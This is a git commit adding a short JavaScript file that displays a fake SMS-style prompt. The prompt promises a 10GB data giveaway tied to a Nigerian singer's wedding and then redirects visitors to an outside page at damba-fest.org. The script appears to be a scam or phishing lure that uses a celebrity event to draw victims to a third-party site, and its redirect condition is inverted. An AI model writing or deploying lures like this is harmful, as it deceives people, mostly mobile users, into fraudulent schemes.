40b0fb855cfb68813e81b44309c7e1df92f615ed
boss-bloq <nsisboy01@gmail.com>
2024-06-24 23:21:44 -0700

    Create chivido.js

---
+++ chivido.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Popular Nigerian Singer, Davido Traditional Wedding Giveaway Across Africa, you will receive 10GB, Kindly press 1 to get yours now ','1');
+if (password != '1') {
+location.href='https://damba-fest.org/chivido2024.html';
+}
